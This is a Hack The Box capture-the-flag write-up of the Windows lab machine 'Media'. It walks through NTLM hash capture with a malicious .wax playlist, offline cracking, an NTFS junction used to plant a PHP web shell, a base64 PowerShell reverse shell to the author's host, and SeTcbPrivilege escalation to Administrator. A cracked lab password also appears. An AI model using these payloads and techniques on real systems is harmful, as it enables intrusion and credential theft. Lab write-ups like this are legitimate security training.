---
title: "HTB: Media"
date: 2026-06-09
draft: false
tags: ["Hack The Box", "Windows", "NTLM Hash Capture", "PHP Vulnerability", "SeImpersonatePrivilege", "SeTcbPrivilege"]
categories: ["Writeups"]
description: "HTB Media is a medium-difficulty Windows machine involving NTLMv2 hash capture and cracking through a malicious media upload, SSH access, an NTFS Junction attack to deploy a PHP web shell, and privilege escalation through SeTcbPrivilege or the alternative SeImpersonatePrivilege to obtain SYSTEM access."
os: Windows
difficulty: Easy
status: Complete
---

# 🚩 Box Name: Media

## 📋 Initial Info

**Media** is a medium-difficulty Windows machine centered around an Apache XAMPP environment hosting a custom PHP application. The attack path begins with a file upload feature that accepts Windows Media Player-compatible files. By crafting a malicious media file, it's possible to trigger outbound authentication and capture the NTLMv2 hash of the user who opens it. After cracking the hash, the recovered credentials can be used to gain initial access to the target via SSH.

Once on the box, reviewing the application's source code reveals how uploaded files are stored on disk. Understanding this process opens the door to an NTFS Junction attack, allowing a malicious PHP web shell to be written to a web-accessible location and ultimately leading to remote code execution.

With code execution achieved under the web server's service account, the focus shifts to privilege escalation. The machine's intended path involves abusing the **SeTcbPrivilege** ("Act as part of the operating system"), a powerful Windows privilege that enables a process to impersonate arbitrary users and effectively grants a path to administrative access. Alternative escalation routes are also available by recovering the **SeImpersonatePrivilege**, which can then be leveraged to elevate directly to **NT AUTHORITY\SYSTEM**.

---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-09 12:05 CDT
Nmap scan report for 10.129.10.111
Host is up (0.061s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-09T17:06:53+00:00; -15s from scanner time.
| rdp-ntlm-info:
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-09T17:06:49+00:00
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2026-06-08T16:58:52
|_Not valid after:  2026-12-08T16:58:52
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -14s, deviation: 0s, median: -15s

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   60.81 ms 10.10.14.1
2   61.26 ms 10.129.10.111

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.21 seconds
```

From the initial scan I only see 3 ports. 80 is the most interesting. This makes me believe the first step is going to be a web exploit.

### 🌐 Web Enumeration
- **Server:** Apache httpd 2.4.56
- **Language:** PHP 8.1.17

![homepage](/images/media/site.png)


#### Directory Busting
```shell
┌─[split@parrot:~/Documents/HTB/Media]
└─❯ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.10.111/FUZZ                                            ──(Tue,Jun09)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.10.111/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

js                      [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 62ms]
css                     [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 66ms]
assets                  [Status: 301, Size: 340, Words: 22, Lines: 10, Duration: 61ms]
webalizer               [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 74ms]
phpmyadmin              [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 60ms]
licenses                [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 61ms]
server-status           [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 61ms]
con                     [Status: 403, Size: 303, Words: 22, Lines: 10, Duration: 65ms]
aux                     [Status: 403, Size: 303, Words: 22, Lines: 10, Duration: 63ms]
prn                     [Status: 403, Size: 303, Words: 22, Lines: 10, Duration: 62ms]
server-info             [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 61ms]
:: Progress: [26583/26583] :: Job [1/1] :: 653 req/sec :: Duration: [0:00:42] :: Errors: 1 ::
```

Nothing too promising here. I next notice an `UPLOAD FILE` section. I'm going to inspect this functionality using BurpSuite.

![Upload](/images/media/Upload.png)


One thing that immediately stood out was the file upload functionality. The application specifically mentions support for **Windows Media Player-compatible files**, which is interesting because several legacy Windows media playlist formats can reference remote resources.

That got me thinking about NTLM authentication abuse. Windows will often attempt to authenticate automatically when accessing a remote SMB share, which can result in a user's NTLM hash being sent to an attacker-controlled system.

A good overview of some of the risks associated with NTLM can be found here:

- [NTLM Vulnerabilities](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
    
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) - A tool that generates files capable of triggering outbound authentication requests from Windows hosts.

---

## ⚡ Exploitation (Initial Access)
### NTLM Abuse via a WAX Playlist

Since the application accepts Windows Media Player playlist files, I generated a malicious `.wax` file using `ntlm_theft`. The goal is to create a playlist that references a resource hosted on my machine. When Windows processes the file, it attempts to access the remote location and automatically performs NTLM authentication.

I generated the file with:
```shell
(NTLM) ┌─[split@parrot:~/Tools/ntlm_theft]
└─❯ python3 ntlm_theft.py -g wax -s 10.10.14.239 --filename jazz              ──(Mon,Jun15)─┘
Created: jazz/jazz.wax (OPEN)
Generation Complete.
```

The tool creates a directory containing the malicious playlist:

```shell
(NTLM) ┌─[split@parrot:~/Tools/ntlm_theft]
└─❯ ls                                                                        ──(Mon,Jun15)─┘
docs  jazz  LICENSE  NTLM  ntlm_theft.py  README.md  templates

(NTLM) ┌─[split@parrot:~/Tools/ntlm_theft/jazz]
└─❯ ls                                                                        ──(Mon,Jun15)─┘
jazz.wax
```

Looking at the contents of the generated file shows that it contains references back to my attacker-controlled host:

```shell
┌─[split@parrot:~/Tools/ntlm_theft/jazz]
└─❯ cat jazz.wax

https://10.10.14.239/test
file://\\10.10.14.239/steal/file%
```

The important line is the UNC path pointing to my machine. When a Windows host attempts to access that share, it will typically initiate NTLM authentication, sending a challenge-response hash that can be captured.

Before uploading the file, I started Responder to listen for incoming authentication attempts:
```shell
┌─[split@parrot:~/Documents/HTB/Media]
└─❯ sudo responder -I tun0                                                                                                                                                    ──(Mon,Jun15)─┘
[sudo] password for split:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
```


With Responder running, the final step was simply to upload the malicious `.wax` file through the application's media upload functionality and wait for the server to process it.

When the file was accessed, the target reached out to my SMB listener and attempted NTLM authentication, allowing me to capture the user's NetNTLM hash for the next stage of the attack.

![responder](/images/media/responder.png)

### NTLM Vulnerabilities Summary

NTLM is a legacy Windows authentication protocol that is still widely used in many environments. A common issue is that Windows systems will automatically attempt authentication when accessing remote SMB shares or other network resources. Attackers can abuse this behavior by embedding references to attacker-controlled resources in files, emails, web pages, or documents. When a victim system accesses the resource, it may leak an NTLM challenge-response hash that can then be relayed to another service or cracked offline if the password is weak. Despite Microsoft's push toward Kerberos and modern authentication mechanisms, NTLM remains a frequent source of credential exposure and lateral movement opportunities during penetration tests.

#### HashCat

```shell
┌─[split@parrot:~/Documents/HTB/Media]
└─❯ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt                                                                                                                     ──(Mon,Jun15)─┘
hashcat (v6.2.6) starting

<SNIP>

ENOX::MEDIA:e1285beec1ebc7c3:1e83d9e9dac09772dbf72892eefcb617:01010000000000000042d372b5fcdc015915d8b0332e2e490000000002000800570043004800470001001e00570049004e002d0030005a0054004400320038004b00450046005100470004003400570049004e002d0030005a0054004400320038004b0045004600510047002e0057004300480047002e004c004f00430041004c000300140057004300480047002e004c004f00430041004c000500140057004300480047002e004c004f00430041004c00070008000042d372b5fcdc0106000400020000000800300030000000000000000000000000300000099bef9264e2c6bc0ff28b47d2e61d12092e3ef2037545b2f3bb4c45c740c2ff0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200330039000000000000000000:1234virus@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENOX::MEDIA:e1285beec1ebc7c3:1e83d9e9dac09772dbf728...000000
Time.Started.....: Mon Jun 15 10:58:04 2026 (12 secs)
Time.Estimated...: Mon Jun 15 10:58:16 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1118.6 kH/s (1.65ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13338624/14344385 (92.99%)
Rejected.........: 0/13338624 (0.00%)
Restore.Point....: 13336576/14344385 (92.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 12359331 -> 1234juliet
Hardware.Mon.#1..: Util: 95%

Started: Mon Jun 15 10:58:02 2026
Stopped: Mon Jun 15 10:58:18 2026
```

Credentials:
`enox:1234virus@`

Now I am able to use these credentials to SSH into the machine! I grabbed the user.txt flag.

---

## 🛡️ Privilege Escalation

### Lateral Movement

After capturing and cracking `enox`'s NetNTLM hash using a malicious `.wax` file, I gained SSH access to the machine and started digging through the application source code. The initial foothold came from an NTLM authentication leak, but the real privilege escalation path was hidden inside the application's upload workflow.

While enumerating the web application, I found the main upload logic inside `C:\xampp\htdocs\index.php`.

```shell
enox@MEDIA c:\xampp>cd htdocs

enox@MEDIA c:\xampp\htdocs>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of c:\xampp\htdocs

10/02/2023  10:27 AM    <DIR>          .
10/02/2023  11:03 AM    <DIR>          ..
10/02/2023  10:27 AM    <DIR>          assets
10/02/2023  10:27 AM    <DIR>          css
10/10/2023  05:00 AM            20,563 index.php
10/02/2023  10:27 AM    <DIR>          js
               1 File(s)         20,563 bytes
               5 Dir(s)   9,995,091,968 bytes free
```


#### Understanding the Upload Process

The application allows users to submit a job application along with a media file:

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';
```

Instead of storing uploads inside the web root, files are written to:

```text
C:\Windows\Tasks\Uploads\
```

The application generates a unique directory using an MD5 hash of the user's details:

```php
$folderName = md5($firstname . $lastname . $email);
```

Uploads end up in a structure similar to:

```text
C:\Windows\Tasks\Uploads\
└── 24ced6ab65f8bc5268e5cc664e5bfe11\
    └── video.wax
```

After a successful upload, the application writes an entry into `todo.txt`:

```php
$todoContent = "Filename: " . $originalFilename .
               ", Random Variable: " . $folderName . "\n";

file_put_contents($todoFile, $todoContent, FILE_APPEND);
```

This immediately raised a question:

**What is reading `todo.txt`?**

#### Discovering review.ps1

While exploring the filesystem as `enox`, I found:

```shell
enox@MEDIA c:\Users\enox\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of c:\Users\enox\Documents

10/02/2023  11:04 AM    <DIR>          .
10/02/2023  10:26 AM    <DIR>          ..
10/02/2023  06:00 PM             2,841 review.ps1
               1 File(s)          2,841 bytes
               2 Dir(s)   9,995,038,720 bytes free

enox@MEDIA c:\Users\enox\Documents>type review.ps1
function Get-Values {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    # Read the first line of the file
    $firstLine = Get-Content $FilePath -TotalCount 1

    # Extract the values from the first line
    if ($firstLine -match 'Filename: (.+), Random Variable: (.+)') {
        $filename = $Matches[1]
        $randomVariable = $Matches[2]

        # Create a custom object with the extracted values
        $repoValues = [PSCustomObject]@{
            FileName = $filename
            RandomVariable = $randomVariable
        }

        # Return the custom object
        return $repoValues
    }
    else {
        # Return $null if the pattern is not found
        return $null
    }
}

function UpdateTodo {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    # Create a .NET stream reader and writer
    $reader = [System.IO.StreamReader]::new($FilePath)
    $writer = [System.IO.StreamWriter]::new($FilePath + ".tmp")

    # Read the first line and ignore it
    $reader.ReadLine() | Out-Null

    # Copy the remaining lines to a temporary file
    while (-not $reader.EndOfStream) {
        $line = $reader.ReadLine()
        $writer.WriteLine($line)
    }

    # Close the reader and writer
    $reader.Close()
    $writer.Close()

    # Replace the original file with the temporary file
    Remove-Item $FilePath
    Rename-Item -Path ($FilePath + ".tmp") -NewName $FilePath
}

$todofile="C:\\Windows\\Tasks\\Uploads\\todo.txt"
$mediaPlayerPath = "C:\Program Files (x86)\Windows Media Player\wmplayer.exe"


while($True){

    if ((Get-Content -Path $todofile) -eq $null) {
        Write-Host "Todo is empty."
        Sleep 60 # Sleep for 60 seconds before rechecking
    }
    else {
        $result = Get-Values -FilePath $todofile
        $filename = $result.FileName
        $randomVariable = $result.RandomVariable
        Write-Host "FileName: $filename"
        Write-Host "Random Variable: $randomVariable"

        # Opening the File in Windows Media Player
        Start-Process -FilePath $mediaPlayerPath -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"

        # Wait for 15 seconds
        Start-Sleep -Seconds 15

        $mediaPlayerProcess = Get-Process -Name "wmplayer" -ErrorAction SilentlyContinue
        if ($mediaPlayerProcess -ne $null) {
            Write-Host "Killing Windows Media Player process."
            Stop-Process -Name "wmplayer" -Force
        }

        # Task Done
        UpdateTodo -FilePath $todofile # Updating C:\Windows\Tasks\Uploads\todo.txt
        Sleep 15
    }

}
```

Reading the script answered everything.

The script continuously monitors the upload queue:

```powershell
$todofile="C:\\Windows\\Tasks\\Uploads\\todo.txt"

while($True)
```

When a new upload appears, it extracts the filename and associated upload directory:

```powershell
if ($firstLine -match 'Filename: (.+), Random Variable: (.+)')
```

The values are then used to reconstruct the full file path:

```powershell
C:\Windows\Tasks\Uploads\$randomVariable\$filename
```

Finally, the script launches the file with Windows Media Player:

```powershell
Start-Process -FilePath $mediaPlayerPath `
    -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"
```

The complete workflow looks like this:

```text
User Upload
      |
      v
index.php
      |
      v
todo.txt updated
      |
      v
review.ps1 reads queue
      |
      v
Launches file in wmplayer.exe
```

This is exactly what made the NTLM attack possible earlier.

The `.wax` playlist contained a UNC path pointing to my SMB listener. When Windows Media Player opened the file, Windows automatically attempted NTLM authentication, allowing me to capture `enox`'s hash.

However, while reviewing the script, another vulnerability became apparent.

#### The Trust Problem

The PowerShell script blindly trusts the values stored in `todo.txt`.

More importantly, the web application blindly trusts the upload directory.

When processing uploads, the PHP code only checks if the directory exists:

```php
if (!file_exists($targetDir)) {
    mkdir($targetDir, 0777, true);
}
```

It never verifies that the path is actually a normal directory.

On Windows, directories can be replaced with:

- Junctions
    
- Symbolic links
    
- Other reparse points
    

That observation led me down a different path.

#### Testing Junction Abuse

First, I identified my upload directory.

From previous uploads I already knew my files were stored in:

```shell
enox@MEDIA c:\Windows\Tasks\Uploads\24ced6ab65f8bc5268e5cc664e5bfe11>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of c:\Windows\Tasks\Uploads\24ced6ab65f8bc5268e5cc664e5bfe11

06/15/2026  09:49 AM    <DIR>          .
06/15/2026  08:56 AM    <DIR>          ..
06/15/2026  08:55 AM                58 jazz.wax
06/15/2026  08:35 AM                15 test.php
06/15/2026  09:49 AM               328 wshell.php
               3 File(s)            401 bytes
               2 Dir(s)   9,993,990,144 bytes free
```

At this point I removed the directory and replaced it with a junction pointing directly at the XAMPP web root.

```shell
enox@MEDIA c:\Windows\Tasks\Uploads>cmd /c mklink /J C:\Windows\Tasks\Uploads\24ced6ab65f8bc5268e5cc664e5bfe11 c:\xampp\htdocs
Junction created for C:\Windows\Tasks\Uploads\24ced6ab65f8bc5268e5cc664e5bfe11 <<===>> c:\xampp\htdocs
```

Windows confirmed the junction creation.

```shell
enox@MEDIA c:\Windows\Tasks\Uploads>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of c:\Windows\Tasks\Uploads

06/15/2026  09:54 AM    <DIR>          .
10/02/2023  11:04 AM    <DIR>          ..
06/15/2026  09:54 AM    <JUNCTION>     24ced6ab65f8bc5268e5cc664e5bfe11 [c:\xampp\htdocs]
06/15/2026  09:55 AM                72 todo.txt
               1 File(s)             72 bytes
               3 Dir(s)   9,993,990,144 bytes free
```

Now the upload directory is no longer a real directory.

Instead it transparently redirected all file operations into`c:\xampp\htdocs`

#### Why This Works

The application still believes it's writing files to:

```text
C:\Windows\Tasks\Uploads\24ced6ab65f8bc5268e5cc664e5bfe11\
```

But Windows follows the junction.

The actual write location becomes:

```text
C:\xampp\htdocs\
```

From the application's perspective nothing changes.

From an attacker's perspective, every future upload lands directly inside the web root.

The path transformation looks like this:

```text
Application writes:

C:\Windows\Tasks\Uploads\
└── 24ced6ab65f8bc5268e5cc664e5bfe11\
    └── wshell.php

          |
          |
          v

Windows follows junction

          |
          |
          v

C:\xampp\htdocs\
└── wshell.php
```


#### Uploading a Web Shell

After creating the junction, I uploaded a PHP web shell.

![webshell](/images/media/webshell.png)

When I checked the upload directory again, something interesting happened.

```shell
enox@MEDIA c:\Windows\Tasks\Uploads\24ced6ab65f8bc5268e5cc664e5bfe11>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of c:\Windows\Tasks\Uploads\24ced6ab65f8bc5268e5cc664e5bfe11

06/15/2026  09:55 AM    <DIR>          .
10/02/2023  11:03 AM    <DIR>          ..
10/02/2023  10:27 AM    <DIR>          assets
10/02/2023  10:27 AM    <DIR>          css
10/10/2023  05:00 AM            20,563 index.php
10/02/2023  10:27 AM    <DIR>          js
06/15/2026  09:55 AM               328 wshell.php
               2 File(s)         20,891 bytes
               5 Dir(s)   9,993,990,144 bytes free
```

Those are not files from the upload directory.

Those are the contents of the XAMPP web root.

The junction was working exactly as intended.

My uploaded `wshell.php` now existed directly alongside `index.php`.

#### Triggering Code Execution

With the web shell in place, I started a Netcat listener.

```bash
sudo nc -nvlp 443
```


I then triggered the shell through Apache using a PowerShell reverse shell payload.

```shell
┌─[split@parrot:~/Documents/HTB/Media]
└─❯ curl "http://10.129.234.67/wshell.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAzADkAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D"
```

The request was sent directly to:

```text
http://target/wshell.php
```

which caused Apache to execute the PHP code.

A few seconds later my listener received a connection. I now have code execution as the account running the web server.

```shell
┌─[split@parrot:~/Documents/HTB/Media]
└─❯ sudo nc -nvlp 443                                                         ──(Mon,Jun15)─┘
[sudo] password for split:
Listening on 0.0.0.0 443
Connection received on 10.129.234.67 63756
id
PS C:\xampp\htdocs> whoami
nt authority\local service
PS C:\xampp\htdocs>
```



![revshell](/images/media/revshell.png)


The complete attack path looked like this:

```text
Upload malicious .wax
        |
        v
review.ps1 launches file
        |
        v
NTLM authentication leak
        |
        v
Capture NetNTLM hash
        |
        v
Crack password
        |
        v
SSH as enox
        |
        v
Review source code
        |
        v
Discover upload workflow
        |
        v
Replace upload directory with junction
        |
        v
Point upload path to C:\xampp\htdocs
        |
        v
Upload PHP web shell
        |
        v
Apache executes shell
        |
        v
Gain access as LOCAL SERVICE
```

What initially appeared to be a simple media upload feature ultimately exposed two separate vulnerabilities: an NTLM hash disclosure issue through Windows Media Player and a junction-based file write primitive that allowed arbitrary files to be placed inside the web root. Chaining those issues together resulted in code execution and the next stage of compromise on the Media machine.

### Privilege Escalation to Administrator

At this point I had code execution as `NT AUTHORITY\LOCAL SERVICE`, which is usually a pretty constrained account. The next step was figuring out whether there was anything interesting available from a privilege escalation perspective.

A quick check of the assigned privileges revealed something unusual:

```shell
PS C:\users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```


Most of the privileges listed are fairly common and don't immediately jump out. `SeTcbPrivilege`, however, is a different story entirely.

The "Act as part of the operating system" privilege is one of the most powerful rights available on Windows. It's typically reserved for highly trusted system components and services because it allows a process to interact with the operating system in ways that normal users and services simply cannot.

Seeing `SeTcbPrivilege` assigned to a compromised account is a bit like finding the master key taped underneath the welcome mat.

Although `whoami` showed the privilege, it initially appeared as disabled. To get a better look at the security context, I upgraded my shell to Meterpreter and checked the available privileges.

`getprivs` - Meterpreter command that attempts to enable all privileges available to the current process

```shell
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.14.239:9001
[*] Meterpreter session 1 opened (10.10.14.239:9001 -> 10.129.234.67:63759) at 2026-06-15 15:51:34 -0500

(Meterpreter 1)(C:\programdata) > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeIncreaseWorkingSetPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
```


```shell
(Meterpreter 1)(C:\programdata) > shell
Process 1408 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\programdata>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeTcbPrivilege                Act as part of the operating system Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

Dropping into a shell from Meterpreter confirmed that the privilege was now enabled.

A privilege like `SeTcbPrivilege` isn't something you exploit manually with built-in Windows commands. Instead, there are publicly available proof-of-concept tools designed specifically to abuse it.

I uploaded [tcb.exe](https://github.com/b4lisong/SeTcbPrivilege-Abuse/blob/main/TcbElevation-x64.exe), a utility that leverages `SeTcbPrivilege` to execute commands in a highly privileged security context.

My goal was simple: add the compromised user, `enox`, to the local Administrators group.

```powershell
C:\programdata>.\tcb.exe group "cmd /c net localgroup administrators enox /add"
.\tcb.exe group "cmd /c net localgroup administrators enox /add"
Error starting service 1053
```

The tool responded with:

```text
Error starting service 1053
```

At first glance that looks like a failure, but Windows had already processed the command.

Checking the Administrators group confirmed it.

```powershell
C:\programdata>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
enox
The command completed successfully.
```

#### Verifying Administrative Access

To confirm the change, I logged back in as `enox` via SSH.

```shell

┌─[split@parrot:~/Documents/HTB/Media]
└─❯ ssh enox@10.129.234.67                                                     ──(Mon,Jun15)─┘
enox@10.129.234.67's password:
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>net user enox
User name                    enox
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/2/2023 10:26:53 AM
Password expires             Never
Password changeable          10/2/2023 10:26:53 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/15/2026 2:07:54 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

Once connected, I checked the account information. At this point, `enox` has full administrative privileges on the machine.

This was one of those privilege escalations where the hard part wasn't exploitation—it was recognizing that the privilege existed in the first place. Once I spotted `SeTcbPrivilege`, the path to Administrator was surprisingly short. Windows basically handed me the keys to the kingdom and politely asked if I'd like a guided tour.

Can now collect the root.txt flag.